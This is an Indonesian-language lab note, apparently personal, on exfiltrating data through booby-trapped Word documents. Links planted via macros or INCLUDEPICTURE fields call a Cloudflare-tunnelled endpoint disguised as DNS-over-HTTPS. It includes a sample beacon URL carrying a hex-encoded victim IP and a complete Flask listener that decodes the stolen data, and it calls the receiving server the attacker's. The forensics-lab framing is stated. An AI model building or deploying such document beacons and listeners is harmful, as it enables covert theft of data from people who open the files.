# Mencoba Teknik DOH (DNS over HTTPS)

###### Materi: penjelasan umum terkait lab reverse shell 
###### Media:  docx/docm + cloudflareTunneling
---
**penjelasan**
hal ini didasari sebab saya mulai menarik melihat hasil di awal testing tadi , saya mencari catatan diberbagai dokumentasi (dengan AI assistent 😂). kemudian saya mendapatkan teknik ini

DNS over HTTPS (DoH) adalah protokol yang mengenkripsi permintaan dan respons Domain Name System (DNS) menggunakan HTTPS. Berbeda dengan DNS biasa yang menggunakan teks polos, DoH menyamarkan lalu lintas pencarian web Anda dengan port HTTPS standar (\(443\)), sehingga meningkatkan privasi dan keamanan dari penyadapan atau manipulasi pihak ketiga [selengkapnya](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/)

jika kita membaca penjelasannya mungkin agak bertolak belakang namun inilah dunia cyber `BUKAN SOAL SEBERAPA AMAN SISTEM ITU, NAMUN SEBERAPA KUAT ANALOGI USER ` hal ini yang membuat saya  untuk mencoba menyuntikkan link kedalam dokument `OOXML`

**cara kerja**
+ script code doh-server. py berjalan di port 5000 - kode ada dibawah
+ kemudian kita jalakan cloudflare tuneeling agar komputer lain bisa saling terbung
+ kemudian korban masuk ke dalam url itu dengan cara link di tanam di file serpti
    + konsep canrytoken 
    + menggunakan macro 
    + insert dengan fieldname "includepicture" 
+ data yang dikirim di koversi dulu ke Hex biar aman

nah ini contoh kode yang kita tanamkan ke dalam file/macro : LINK DI SESUAIKAN
```bash
https://biz-signing-parallel-fastest.trycloudflare.com/dns-query?name=49503a31302e3139332e3233372e313139.labforensik
```

jadi data akan dikirimkan ke komputer kita (server) -sebagai penyerang

**script code**
berikut adalah scirpt code "doh-server. py" yang di tugaskan sebagai pendengar nantinya. bisa kamu sesuaikan juga dengan keinginan mu :

```python
from flask import Flask, request, jsonify
import binascii

app = Flask(__name__)

print("[*] DoH Forensic Lab Server siap mendengarkan di http://127.0.0.1:5000 ...")

@app.route('/dns-query', methods=['GET'])
def doh_endpoint():
    # 1. Tangkap parameter 'name' yang dikirim oleh MS Word via Cloudflare
    domain_target = request.args.get('name', '')
    
    if "labforensik" in domain_target:
        print(f"\n[ ALERT - DoH EXFILTRATION DETECTED]")
        print(f" -> Jalur Protokol : HTTPS (Port 443 via Cloudflare)")
        print(f" -> URL Lengkap    : {request.url}")
        
        try:
            # 2. Pisahkan domain untuk mengambil string Hex di depannya
            subdomain_raw = domain_target.split('labforensik')[0]
            clean_hex_text = "".join(c for c in subdomain_raw if c in "0123456789abcdefABCDEF")
            
            print(f" -> Subdomain (Hex Text): {clean_hex_text}")
            
            # 3. Decode string hex menjadi teks asli manusia
            decoded_data = binascii.unhexlify(clean_hex_text).decode('utf-8')
            print(f" -> Hasil Dekripsi DoH  : {decoded_data}")
            
            print("-" * 50)
            return jsonify({"Status": 0, "Message": "DNS Resolution Success", "Data": decoded_data}), 200
        except Exception as e:
            print(f"[-] Gagal dekripsi data: {e}")
            
    return jsonify({"Status": 5, "Message": "Refused"}), 400

if __name__ == '__main__':
    # Berjalan di port 5000 berbasis HTTP (TCP) yang dicintai Cloudflare
    app.run(port=5000, debug=False)
```
